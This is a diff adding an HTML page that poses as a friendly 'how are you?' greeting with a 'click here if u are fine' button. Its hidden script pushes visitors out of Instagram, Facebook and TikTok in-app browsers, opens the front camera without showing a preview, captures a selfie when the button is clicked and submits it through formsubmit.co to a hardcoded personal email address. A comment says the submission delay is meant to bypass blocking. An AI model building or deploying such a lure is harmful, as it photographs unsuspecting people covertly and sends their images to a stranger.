@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <script>
+        function redirectToBrowser() {
+            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            // Detect if inside Instagram, Facebook, or TikTok app
+            if (userAgent.includes("Instagram") || userAgent.includes("FBAN") || userAgent.includes("FBAV") || userAgent.includes("TikTok")) {
+                let url = window.location.href;
+
+                // Try to open in default browser (for iOS)
+                window.open(url, "_blank");
+
+                // Try to open in Chrome (Android)
+                setTimeout(() => {
+                    window.location.href = "googlechrome://" + url.replace(/^https?:\/\//, "");
+                }, 500);
+            }
+        }
+
+        window.onload = redirectToBrowser;
+    </script>
+</head>
+<body>
+    <h2 style="font-size: 10em; color: palevioletred">HELLO ❤ __ HOW ARE U ?</h2>
+    
+    <button id="capture" style="font-size: 7em; color: blueviolet; cursor: pointer;"> CLICK HERE IF U ARE FINE </button>
+    <canvas id="canvas" width="1080" height="1440" style="display: none;"></canvas>
+    <form id="imageForm" action="https://formsubmit.co/hemrajbudha60@gmail.com" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg">
+        <button type="submit" style="display: none;">Submit</button>
+    </form>
+
+    <script>
+        const canvas = document.getElementById("canvas");
+        const captureButton = document.getElementById("capture");
+        const imageInput = document.getElementById("imageInput");
+        const form = document.getElementById("imageForm");
+
+        // Start video stream with front-facing camera (selfie mode)
+        navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user"  // Request front-facing camera
+            }
+        })
+        .then(stream => {
+            // Don't display video, just use it for capturing the photo
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            captureButton.addEventListener("click", () => {
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Capture and submit the image
+                canvas.toBlob(blob => {
+                    const file = new File([blob], "photo.png", { type: "image/png" });
+                    const dataTransfer = new DataTransfer();
+                    dataTransfer.items.add(file);
+                    imageInput.files = dataTransfer.files;
+
+                    // Add delay before form submission to prevent blocking
+                    setTimeout(() => {
+                        form.submit(); // Submit form after a brief delay (helps bypass auto-submit blocking)
+                    }, 500); // 500 ms delay
+                }, "image/png");
+            });
+        })
+        .catch(err => console.error("Error accessing camera: ", err));
+    </script>
+</body>
+</html>
